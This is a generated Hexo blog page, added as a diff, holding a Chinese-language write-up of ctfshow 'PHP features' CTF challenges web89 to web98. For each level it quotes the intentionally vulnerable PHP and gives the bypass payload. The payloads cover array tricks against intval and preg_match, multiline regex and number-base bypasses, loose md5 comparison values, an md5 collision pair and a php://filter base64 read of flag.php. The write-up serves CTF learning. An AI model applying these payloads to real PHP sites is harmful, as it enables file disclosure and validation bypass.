@@ -1,0 +1,375 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="web89123456789101112include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&amp;#x27;num&amp;#x27;]))&amp;#123;    $num &#x3D; $_GET[&amp;#x27;num&amp;#x27;];    if(preg_match(&quot;&#x2F;[0-9]&#x2F;&quot;, $num))&amp;#123;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfshow--php特性篇">
+<meta property="og:url" content="http://example.com/2020/05/30/ctfshow-php%E7%89%B9%E6%80%A7%E7%AF%87/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="web89123456789101112include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&amp;#x27;num&amp;#x27;]))&amp;#123;    $num &#x3D; $_GET[&amp;#x27;num&amp;#x27;];    if(preg_match(&quot;&#x2F;[0-9]&#x2F;&quot;, $num))&amp;#123;">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2020-05-30T03:01:18.000Z">
+<meta property="article:modified_time" content="2023-12-30T03:03:23.459Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>ctfshow--php特性篇</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2023/10/27/hello-world/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2020/05/30/ctfshow-php%E7%89%B9%E6%80%A7%E7%AF%87/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2020/05/30/ctfshow-php%E7%89%B9%E6%80%A7%E7%AF%87/&text=ctfshow--php特性篇"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2020/05/30/ctfshow-php%E7%89%B9%E6%80%A7%E7%AF%87/&title=ctfshow--php特性篇"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2020/05/30/ctfshow-php%E7%89%B9%E6%80%A7%E7%AF%87/&is_video=false&description=ctfshow--php特性篇"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ctfshow--php特性篇&body=Check out this article: http://example.com/2020/05/30/ctfshow-php%E7%89%B9%E6%80%A7%E7%AF%87/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2020/05/30/ctfshow-php%E7%89%B9%E6%80%A7%E7%AF%87/&title=ctfshow--php特性篇"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2020/05/30/ctfshow-php%E7%89%B9%E6%80%A7%E7%AF%87/&title=ctfshow--php特性篇"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2020/05/30/ctfshow-php%E7%89%B9%E6%80%A7%E7%AF%87/&title=ctfshow--php特性篇"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2020/05/30/ctfshow-php%E7%89%B9%E6%80%A7%E7%AF%87/&title=ctfshow--php特性篇"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2020/05/30/ctfshow-php%E7%89%B9%E6%80%A7%E7%AF%87/&name=ctfshow--php特性篇&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2020/05/30/ctfshow-php%E7%89%B9%E6%80%A7%E7%AF%87/&t=ctfshow--php特性篇"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#web89"><span class="toc-number">1.</span> <span class="toc-text">web89</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web90"><span class="toc-number">2.</span> <span class="toc-text">web90:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web91"><span class="toc-number">3.</span> <span class="toc-text">web91:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web92"><span class="toc-number">4.</span> <span class="toc-text">web92:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web93%EF%BC%9A"><span class="toc-number">5.</span> <span class="toc-text">web93：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web95"><span class="toc-number">6.</span> <span class="toc-text">web95:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web96"><span class="toc-number">7.</span> <span class="toc-text">web96</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web97"><span class="toc-number">8.</span> <span class="toc-text">web97:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8B%93%E5%B1%95%EF%BC%9A"><span class="toc-number">9.</span> <span class="toc-text">拓展：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E6%AF%94%E8%BE%83md5%E5%80%BC%E6%97%B6%E7%94%A8%E7%9A%84%E6%98%AF%E5%BC%B1%E6%AF%94%E8%BE%83%EF%BC%88-%EF%BC%8C%E4%BD%BF%E7%94%A8%E5%BC%BA%E5%88%B6%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2%E5%90%8E%E4%B8%8D%E5%9C%A8%E6%8E%A5%E6%94%B6%E6%95%B0%E7%BB%84"><span class="toc-number">9.0.1.</span> <span class="toc-text">1.比较md5值时用的是弱比较（&#x3D;&#x3D;)，使用强制类型转换后不在接收数组</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-md5%E5%BC%BA%E7%A2%B0%E6%92%9E%EF%BC%88%E6%AF%94%E8%BE%83md5%E5%80%BC%E6%97%B6%E7%94%A8%E7%9A%84%E6%98%AF%E5%BC%BA%E6%AF%94%E8%BE%83%EF%BC%88-%EF%BC%89%EF%BC%89"><span class="toc-number">9.0.2.</span> <span class="toc-text">2.md5强碰撞（比较md5值时用的是强比较（&#x3D;&#x3D;&#x3D;））</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web98"><span class="toc-number">10.</span> <span class="toc-text">web98:</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        ctfshow--php特性篇
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">John Doe</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-05-30T03:01:18.000Z" class="dt-published" itemprop="datePublished">2020-05-30</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h3 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">    $num = $_GET[&#x27;num&#x27;];</span><br><span class="line">    if(preg_match(&quot;/[0-9]/&quot;, $num))&#123;</span><br><span class="line">        die(&quot;no no no!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(intval($num))&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>preg_match()函数：preg_match()只能处理字符串，当传入的是数组时将会返回false。</p>
+<p>传入一个数组会返回flase。</p>
+<p>intval()函数：</p>
+<p>intval() 不能用于 object，否则会产生 E_WARNING 错误并返回 1。 传入num[]&#x3D;1，相当于传入了一个array类型的object，而且就算传入的是”num[]&#x3D;“这个object也是非空的。</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num[]=1</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="web90"><a href="#web90" class="headerlink" title="web90:"></a>web90:</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">    $num = $_GET[&#x27;num&#x27;];</span><br><span class="line">    if($num===&quot;4476&quot;)&#123;</span><br><span class="line">        die(&quot;no no no!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(intval($num,0)===4476)&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo intval($num,0);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p>两个if判断用的都是强等于，也就是类型和数据都要一致，intval($num,0)，第二个参数是0表示函数会判断数据的二进制，传二进制、八进制、十六进制的4476都行。</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=0x117c</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="web91"><a href="#web91" class="headerlink" title="web91:"></a>web91:</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">show_source(__FILE__);</span><br><span class="line">include(&#x27;flag.php&#x27;);</span><br><span class="line">$a=$_GET[&#x27;cmd&#x27;];</span><br><span class="line">if(preg_match(&#x27;/^php$/im&#x27;, $a))&#123;</span><br><span class="line">    if(preg_match(&#x27;/^php$/i&#x27;, $a))&#123;</span><br><span class="line">        echo &#x27;hacker&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    echo &#x27;nonononono&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>&#x2F;i表示不区分大小写，&#x2F;m表示多行匹配(more)，即第一行没匹配成功，匹配第二行，第二行匹配到了也会返回1</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=aaa%0aphp</span><br></pre></td></tr></table></figure>
+
+<p>preg_match()会把%0a当作换行符，第一行没匹配成功只能换行去匹配下一行，下一行匹配成功了，绕过了第一个preg_match()，第二个preg_match()不是多行匹配，所以匹配不通过。</p>
+<h3 id="web92"><a href="#web92" class="headerlink" title="web92:"></a>web92:</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">    $num = $_GET[&#x27;num&#x27;];</span><br><span class="line">    if($num==4476)&#123;</span><br><span class="line">        die(&quot;no no no!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(intval($num,0)==4476)&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo intval($num,0);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到if判断用的是”&#x3D;&#x3D;”，比较过程中会把两边都转化成字符串再比较，传入4476的其他进制即可。</p>
+<h3 id="web93："><a href="#web93：" class="headerlink" title="web93："></a>web93：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">    $num = $_GET[&#x27;num&#x27;];</span><br><span class="line">    if($num==4476)&#123;</span><br><span class="line">        die(&quot;no no no!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123;</span><br><span class="line">        die(&quot;no no no!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(intval($num,0)==4476)&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo intval($num,0);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>同web92差不多，又过滤了字母，传入4476的8进制即可（不含字母）</p>
+<h3 id="web95"><a href="#web95" class="headerlink" title="web95:"></a>web95:</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">    $num = $_GET[&#x27;num&#x27;];</span><br><span class="line">    if($num==4476)&#123;</span><br><span class="line">        die(&quot;no no no!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&quot;/[a-z]|\./i&quot;, $num))&#123;</span><br><span class="line">        die(&quot;no no no!!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(!strpos($num, &quot;0&quot;))&#123;</span><br><span class="line">        die(&quot;no no no!!!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(intval($num,0)===4476)&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>增加了一段新的过滤代码：</p>
+<pre><code>if(!strpos($num, &quot;0&quot;))&#123;
+    die(&quot;no no no!!!&quot;);
+&#125;
+</code></pre>
+<p>这段代码的功能是查找字符’0’在字符串num中的位置，如果还是使用八进制010574的话，第一个就匹配到了0，会返回位置为0，所以在开头加一个空格?num&#x3D; 010574或者?num&#x3D;4476.0</p>
+<h3 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;u&#x27;]))&#123;</span><br><span class="line">    if($_GET[&#x27;u&#x27;]==&#x27;flag.php&#x27;)&#123;</span><br><span class="line">        die(&quot;no no no&quot;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        highlight_file($_GET[&#x27;u&#x27;]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?u=./flag.php</span><br><span class="line">?u=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="web97"><a href="#web97" class="headerlink" title="web97:"></a>web97:</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if (isset($_POST[&#x27;a&#x27;]) and isset($_POST[&#x27;b&#x27;])) &#123;</span><br><span class="line">if ($_POST[&#x27;a&#x27;] != $_POST[&#x27;b&#x27;])</span><br><span class="line">if (md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;]))</span><br><span class="line">echo $flag;</span><br><span class="line">else</span><br><span class="line">print &#x27;Wrong.&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+
+<p>要求传参不相等但他们的MD5值相等。</p>
+<p>考察点：php中hash比较缺陷</p>
+<p>原因：md5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL，也就是强相等的。</p>
+<h3 id="拓展："><a href="#拓展：" class="headerlink" title="拓展："></a>拓展：</h3><h5 id="1-比较md5值时用的是弱比较（-，使用强制类型转换后不在接收数组"><a href="#1-比较md5值时用的是弱比较（-，使用强制类型转换后不在接收数组" class="headerlink" title="1.比较md5值时用的是弱比较（&#x3D;&#x3D;)，使用强制类型转换后不在接收数组"></a>1.比较md5值时用的是弱比较（&#x3D;&#x3D;)，使用强制类型转换后不在接收数组</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$a=(string)$a;</span><br><span class="line">$b=(string)$b;</span><br><span class="line">if(($a!==$b)&amp;&amp;(md5($a)==md5($b))&#123;</span><br><span class="line">	echo $flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">md5弱比较，为0e开头的会被识别为科学计数法，结果均为0，所以只需找两个md5加密后都为0e开头的且0e后面均为数字的值即可。</span><br><span class="line">payload：a=QNKCDZO&amp;b=240610708</span><br></pre></td></tr></table></figure>
+
+<h5 id="2-md5强碰撞（比较md5值时用的是强比较（-））"><a href="#2-md5强碰撞（比较md5值时用的是强比较（-））" class="headerlink" title="2.md5强碰撞（比较md5值时用的是强比较（&#x3D;&#x3D;&#x3D;））"></a>2.md5强碰撞（比较md5值时用的是强比较（&#x3D;&#x3D;&#x3D;））</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$a=(string)$a;</span><br><span class="line">$b=(string)$b;</span><br><span class="line">if(($a!==$b)&amp;&amp;(md5($a)===md5($b)))&#123;</span><br><span class="line">	echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">这时需要找到两个真正的md5值相同的数据</span><br><span class="line">a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</span><br><span class="line"></span><br><span class="line">注意以上数据是经过urlencode()的，不能直接放到hackbar里，hackbar会再urlenocde()一次，要放到burp里。</span><br></pre></td></tr></table></figure>
+
+<h3 id="web98"><a href="#web98" class="headerlink" title="web98:"></a>web98:</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$_GET?$_GET=&amp;$_POST:&#x27;flag&#x27;;</span><br><span class="line">$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_COOKIE:&#x27;flag&#x27;;</span><br><span class="line">$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_SERVER:&#x27;flag&#x27;;</span><br><span class="line">highlight_file($_GET[&#x27;HTTP_FLAG&#x27;]==&#x27;flag&#x27;?$flag:__FILE__);</span><br></pre></td></tr></table></figure>
+
+<p>三元运算符，如果有get传参，就被post传参变量覆盖，第二行和第三行代码没啥用</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get：1=a post：HTTP_FLAG=flag</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#web89"><span class="toc-number">1.</span> <span class="toc-text">web89</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web90"><span class="toc-number">2.</span> <span class="toc-text">web90:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web91"><span class="toc-number">3.</span> <span class="toc-text">web91:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web92"><span class="toc-number">4.</span> <span class="toc-text">web92:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web93%EF%BC%9A"><span class="toc-number">5.</span> <span class="toc-text">web93：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web95"><span class="toc-number">6.</span> <span class="toc-text">web95:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web96"><span class="toc-number">7.</span> <span class="toc-text">web96</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web97"><span class="toc-number">8.</span> <span class="toc-text">web97:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8B%93%E5%B1%95%EF%BC%9A"><span class="toc-number">9.</span> <span class="toc-text">拓展：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E6%AF%94%E8%BE%83md5%E5%80%BC%E6%97%B6%E7%94%A8%E7%9A%84%E6%98%AF%E5%BC%B1%E6%AF%94%E8%BE%83%EF%BC%88-%EF%BC%8C%E4%BD%BF%E7%94%A8%E5%BC%BA%E5%88%B6%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2%E5%90%8E%E4%B8%8D%E5%9C%A8%E6%8E%A5%E6%94%B6%E6%95%B0%E7%BB%84"><span class="toc-number">9.0.1.</span> <span class="toc-text">1.比较md5值时用的是弱比较（&#x3D;&#x3D;)，使用强制类型转换后不在接收数组</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-md5%E5%BC%BA%E7%A2%B0%E6%92%9E%EF%BC%88%E6%AF%94%E8%BE%83md5%E5%80%BC%E6%97%B6%E7%94%A8%E7%9A%84%E6%98%AF%E5%BC%BA%E6%AF%94%E8%BE%83%EF%BC%88-%EF%BC%89%EF%BC%89"><span class="toc-number">9.0.2.</span> <span class="toc-text">2.md5强碰撞（比较md5值时用的是强比较（&#x3D;&#x3D;&#x3D;））</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web98"><span class="toc-number">10.</span> <span class="toc-text">web98:</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2020/05/30/ctfshow-php%E7%89%B9%E6%80%A7%E7%AF%87/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2020/05/30/ctfshow-php%E7%89%B9%E6%80%A7%E7%AF%87/&text=ctfshow--php特性篇"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2020/05/30/ctfshow-php%E7%89%B9%E6%80%A7%E7%AF%87/&title=ctfshow--php特性篇"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2020/05/30/ctfshow-php%E7%89%B9%E6%80%A7%E7%AF%87/&is_video=false&description=ctfshow--php特性篇"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
